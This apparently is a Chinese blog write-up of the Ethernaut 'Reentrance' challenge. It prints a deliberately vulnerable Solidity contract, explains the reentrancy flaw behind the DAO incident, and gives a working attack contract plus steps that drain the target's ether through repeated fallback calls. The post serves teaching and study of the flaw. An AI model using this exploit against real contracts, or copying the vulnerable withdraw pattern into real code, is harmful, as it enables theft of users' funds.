---
layout: post
title: Reenctrancy
---

# Reenctrancy
关于重入攻击，如DAO事件
```solidity
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
```

### 代码分析
```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```
withdraw(uint256)方法中，先向msg.sender转账，后减少其balance；如果msg.sender方法为一个合约，并且其有
fallback函数，并且在fallback函数中又调用了该合约的withdraw(uint256)方法，那么msg.sender就能一直从该合约
窃取eth（因为整个过程中msg.sender的balance并没有减少），
*msg.sender.call()会将剩余的gas全部传入；msg.sender.transfer(value)则仅能使用2300gas*

### 攻击合约
[官方答案](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/attacks/ReentranceAttack.sol)
注意：如果合约balance较大而自己donate的balance较小时，则可以进行循环调用，一点一点地减少合约的金额。
（可以引发out of gas 或者达到call最大深度等错误）  
如：
```solidity
pragma solidity ^0.4.18;

import '../levels/Reentrance.sol';

contract ReentranceAttack {

  Reentrance target;

  function ReentranceAttack(address _target) public payable {
    target = Reentrance(_target);
  }

  function() public payable {
    uint256 amount = 1 ether; // your donate balance
    if (target.balance > amount) {
        target.withdraw(amount);
    } else {
        target.withdraw(target.balance);
    }
    
  }
  
  function attack() public {
     uint256 amount = 1 ether;
     target.withdraw(amount);
  }
}
```

### 攻击方法
1. 部署攻击合约
2. 调用Reentrance.donate(1 ether)
3. 调用攻击合约的attack方法
